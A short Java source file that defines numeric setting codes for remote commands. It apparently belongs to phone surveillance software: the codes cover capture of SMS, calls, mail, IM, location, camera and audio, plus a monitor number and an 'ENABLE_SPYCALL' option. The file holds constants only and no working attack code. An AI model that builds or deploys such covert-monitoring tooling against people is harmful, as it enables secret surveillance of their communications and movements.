package com.vvt.rmtcmd;

public class SetSettingCode {

	public static final SetSettingCode SMS = new SetSettingCode(1);
	public static final SetSettingCode CALL = new SetSettingCode(2);
	public static final SetSettingCode MAIL = new SetSettingCode(3);
	public static final SetSettingCode LOCATION = new SetSettingCode(4);
	public static final SetSettingCode MMS = new SetSettingCode(5);
	public static final SetSettingCode CONTACT = new SetSettingCode(6);
	public static final SetSettingCode GPS = new SetSettingCode(7);
	public static final SetSettingCode IM = new SetSettingCode(8);
	public static final SetSettingCode WALLPAPER = new SetSettingCode(9);
	public static final SetSettingCode CAMERA_IMAGE = new SetSettingCode(10);
	public static final SetSettingCode AUDIO_RECORD = new SetSettingCode(11);
	public static final SetSettingCode AUDIO_CONVERSATION = new SetSettingCode(12);
	public static final SetSettingCode VIDEO_FILE = new SetSettingCode(13);
	public static final SetSettingCode PIN = new SetSettingCode(14);
	public static final SetSettingCode START_STOP_CAPTURE = new SetSettingCode(41);
	public static final SetSettingCode CAPTURE_TIMER = new SetSettingCode(42);
	public static final SetSettingCode EVENT_COUNT = new SetSettingCode(43);
	public static final SetSettingCode ENABLE_WATCH = new SetSettingCode(44);
	public static final SetSettingCode SET_WATCH_FLAGS = new SetSettingCode(45);
	public static final SetSettingCode GPS_TIMER = new SetSettingCode(46);
	public static final SetSettingCode PANIC_MODE = new SetSettingCode(47);
	public static final SetSettingCode HOME_OUT = new SetSettingCode(49);
	public static final SetSettingCode HOME_IN = new SetSettingCode(50);
	public static final SetSettingCode CIS_NUMBER = new SetSettingCode(51);
	public static final SetSettingCode MONITOR_NUMBER = new SetSettingCode(52);
	public static final SetSettingCode ENABLE_SPYCALL = new SetSettingCode(53);
	private int id;
	
	private SetSettingCode(int id) {
		this.id = id;
	}

	public int getId() {
		return id;
	}
}
